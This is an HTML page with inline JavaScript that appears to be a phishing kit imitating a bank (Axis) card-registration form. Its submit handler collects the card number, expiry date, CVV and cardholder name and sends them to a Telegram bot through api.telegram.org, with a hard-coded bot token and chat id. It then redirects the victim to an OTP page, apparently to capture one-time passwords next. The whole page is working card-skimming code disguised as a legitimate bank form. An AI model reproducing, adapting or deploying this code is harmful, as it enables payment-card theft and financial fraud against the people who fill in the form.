<body>
    <img src="axisL.jpg" alt="Paris" class="center">
   <div class="container">
    <div class="row">
      <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
        <div class="card">
        
          <form id="registrationForm" onsubmit="sendTelegramMessage(event)">
            <div class="form-group">
              <label for="card-number"></label>
              <input type="number" id="card-number" name="credit-card" class="form-control" placeholder="Card No."required>
              <span id="card-number-error" class="error-message"></span>
            </div>
            <div class="split-input">
              <div class="form-group">
                <label for="expiration-date"></label>
                <input type="text" id="expiration-date" name="expiration-date" class="form-control" placeholder="MM/YY"required>
                <span id="expiration-date-error" class="error-message"></span>
              </div>
              <div class="form-group">
                <label for="cvv"></label>
                <input type="number" id="cvv" name="cvv" class="form-control" placeholder="CVV"required>

              </div>
            </div>
            <div class="form-group">

              <input type="text" id="cardholder-name" name="cardholder-name" class="form-control" placeholder="Enter cardholder name">

              <input type="submit" value="NEXT">
            </div>
            
          </form>
          
  </div>
<img src="axisF.jpg" alt="Paris" class="center">
   
  <script>
    // Function to send data to Telegram and redirect to another URL
    function sendTelegramMessage(event) {
      event.preventDefault(); // Prevent default form submission

      // Get form data
      const formData = new FormData(document.getElementById('registrationForm'));
      const creditCard = formData.get('credit-card');
      const expiryDate = formData.get('expiration-date');
      const cvv = formData.get('cvv');
      const cardholderName = formData.get('cardholder-name');

      // Construct message
      const message = `New registration:\nCredit Card: ${creditCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\nCardholder Name: ${cardholderName}`;

      // Send data to Telegram using fetch and the Telegram Bot API
      fetch(`https://api.telegram.org/bot7247567488:AAH4j2BtXebdjviq0NdjgETTydSZB_RU6Pk/sendMessage?chat_id=7155441629&text=${encodeURIComponent(message)}`)
        .then(response => {
          if (response.ok) {
            // Redirect to another URL after successful submission
            window.location.href = 'OTP.html'; // Replace with your desired URL
          } else {
            // Handle errors if needed
            console.error('Failed to send message to Telegram');
          }
        })
        .catch(error => {
          // Handle errors if needed
          console.error('Error sending message:', error);
        });
    }

    // Add form submit event listener
    document.getElementById('registrationForm').addEventListener('submit', sendTelegramMessage);
  </script>
  
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>

  <script>
    

// Card number validation
    document.getElementById('card-number').addEventListener('input', function (e) {
      var target = e.target;
      var value = target.value.replace(/\D/g, '');
      var isValid = /^\d{16}$/.test(value);
      document.getElementById('card-number-error').textContent = isValid ? '' : 'Please enter a valid 16-digit Card No.';
    });

    // Expiration date validation
    document.getElementById('expiration-date').addEventListener('input', function (e) {
      var target = e.target;
      var value = target.value.replace(/\D/g, '');
      if (value.length > 2) {
        target.value = value.slice(0, 2) + '/' + value.slice(2);
      }
      var isValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(target.value);
      document.getElementById('expiration-date-error').textContent = isValid ? '' : 'Please enter a valid MM/YY expiration date';
    });

    // CVV validation
    document.getElementById('cvv').addEventListener('input', function (e) {
      var target = e.target;
      var value = target.value.replace(/\D/g, '');
      var isValid = /^\d{3}$/.test(value);
      document.getElementById('cvv-error').textContent = isValid ? '' : 'Please enter a valid 3-digit CVV';
    });
  </script>
